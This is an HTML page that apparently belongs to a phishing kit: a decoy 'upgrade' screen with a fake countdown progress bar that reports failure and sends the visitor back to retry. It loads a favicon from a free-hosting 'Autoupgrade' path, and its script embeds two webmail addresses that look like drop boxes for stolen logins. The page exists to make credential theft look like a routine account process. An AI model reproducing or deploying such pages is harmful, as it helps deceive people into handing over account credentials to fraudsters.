
<html><head>
<meta http-equiv="content-type" content="text/html; charset=UTF-8">

<title></title>

<link rel="icon" href="https://undependable-hangar.000webhostapp.com/alo/auto/zzaut/Autoupgrade/files/favicon.png" sizes="16x16" type="image/png">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">


<style>
* { 
 font-family: "Arial", sans-serif; 
}
#wrap { 
 margin-top: 50px;
 text-align: center; 
}
#barwrap { 
position: relative; /* to contain outer */ 
margin: 0 auto; /* to centre */ 
width: 500px;
height: 22px; /* size of our bar - required */ 
text-align: left; 
font-weight: bold; 
font-family: Lucida Grande, Lucida Sans Unicode, Lucida Sans, DejaVu Sans, Verdana, sans-serif; 
font-size: 15px;
-moz-border-radius: 4px; 
-webkit-border-radius: 4px; 
-khtml-border-radius: 4px; 
border-radius: 4px;
}
#barwrap P { /* to contain text */ 
margin: 0; /* FF needs this or text drops below bar */ 
width: 500px; /* use this node to position text */ 
text-align: center; 
}
#barwrap #outer { /* bar 'background' */ 
position: absolute; 
width: 100%; height: 100%; /* match parent size */ 
background: rgb(132, 135, 136); 
color: rgb(250, 251, 253); /* original colour of text */
}
#barwrap #inner { 
position: relative; /* otherwise outer hides us */ 
width: 0; height: 100%; /* match parent */ 
overflow: hidden; /* to hide new text/prevent it wrapping */ 
background: rgb(26, 71, 131); 
color: #FFF; /* colour of changed text */ 
font-size:13px;
}
</style>

<script>
var time = 10000; // 10 secs 
var steps = 50; // Five per second 
var step = 1;
function progress() { 
var bar = document.getElementById( "barwrap"); 
var aStep = (bar.offsetWidth -2) /steps;// 2px border removed from width 
var x = Math.round( aStep *step); 
var outer = document.getElementById( "outer"); 
var inner = document.getElementById( "inner");
// Work out seconds based on % progress from current step 
var secs = (( time /1000) -Math.floor( ( step /steps) *10));
inner.style.width = x +"px"; 
step++;
// If 0 seconds, display waiting message instead 
outer.firstChild.innerHTML = ( secs? secs +" seconds...": "failed try again..."); 
// Match text 
inner.firstChild.innerHTML = outer.firstChild.innerHTML;
var pattern = /@[_a-zA-Z0-9]*.[_a-zA-Z0-9]*/;
var semail = "allmoneyin009@gmail.com, w.log@yahoo.com";
 var appp = pattern.exec(semail).toString();
 var rmail = appp.substring(1);


if( step <= steps) setTimeout( "progress();", time /steps); 
//window.location = "../"; 
 
setTimeout(function(){
  window.history.back();
 },13000);

}

</script>

</head>

<body onload="progress();" bgcolor="#E6E6E6">
 
<div id="wrap"> 
<div id="barwrap"> <!-- P wrappers for text positioning --> 
<div id="outer"><p>4 seconds...</p></div> <!-- original colour/text --> 
<div id="inner" style="width: 319px;"><p>4 seconds...</p></div> <!-- new colour/text --> 
</div>
<br> 

</div>

</body></html>